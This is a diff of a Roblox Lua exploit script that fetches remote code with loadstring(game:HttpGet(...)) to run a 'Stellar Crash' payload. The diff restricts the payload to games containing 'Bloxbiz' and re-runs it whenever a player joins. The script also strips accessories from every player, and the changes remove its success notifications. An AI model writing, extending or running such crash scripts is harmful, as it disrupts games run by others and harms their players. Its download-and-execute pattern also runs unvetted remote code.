@@ -17,6 +17,16 @@ fpsLabel.Font = Enum.Font.SourceSans
 fpsLabel.TextSize = 20
 fpsLabel.Text = "FPS: 0"
 
+-- Function to check if the game contains "Bloxbiz"
+local function checkForBloxbiz()
+    for _, item in ipairs(ReplicatedStorage:GetDescendants()) do
+        if item.Name:lower():find("bloxbiz") then
+            return true
+        end
+    end
+    return false
+end
+
 -- Function to remove all accessories from all players
 local function removeAllAccessories()
     for _, player in pairs(Players:GetPlayers()) do
@@ -71,19 +81,13 @@ local loadstringUrls = {
 }
 local currentUrlIndex = 1
 
--- Function to execute the loadstring and notify
+-- Function to execute the loadstring
 local function executeStellarCrash()
     local success, err = pcall(function()
         loadstring(game:HttpGet(loadstringUrls[currentUrlIndex]))()
     end)
 
-    if success then
-        StarterGui:SetCore("SendNotification", {
-            Title = "Refreshing Stellar Crash",
-            Text = "The crash script has been refreshed using a new configuration.",
-            Duration = 5
-        })
-    else
+    if not success then
         warn("Failed to execute the script: " .. err)
     end
 
@@ -91,21 +95,34 @@ local function executeStellarCrash()
     currentUrlIndex = currentUrlIndex == 1 and 2 or 1
 end
 
--- Execute the loadstring once at the start
-StarterGui:SetCore("SendNotification", {
-    Title = "Stellar Crash Initialized",
-    Text = "The crash script has been executed for the first time.",
-    Duration = 5
-})
-executeStellarCrash()
+-- Initial game check for "Bloxbiz"
+if checkForBloxbiz() then
+    StarterGui:SetCore("SendNotification", {
+        Title = "Game Supported",
+        Text = "This game contains Bloxbiz and is supported.",
+        Duration = 5
+    })
+
+    -- Execute the loadstring once at the start
+    executeStellarCrash()
+else
+    StarterGui:SetCore("SendNotification", {
+        Title = "Game Not Supported",
+        Text = "This game does not contain Bloxbiz.",
+        Duration = 5
+    })
+end
 
 -- Listen for new players joining and execute the loadstring again
 Players.PlayerAdded:Connect(function(player)
     StarterGui:SetCore("SendNotification", {
         Title = "New Player Joined",
-        Text = player.Name .. " joined the game. Refreshing Stellar Crash.",
+        Text = player.Name .. " joined the game. Refreshing Stellar Crash...",
         Duration = 5
     })
+
+    -- Wait a short delay before executing the refresh
+    task.wait(2)
     executeStellarCrash()
 end)
 
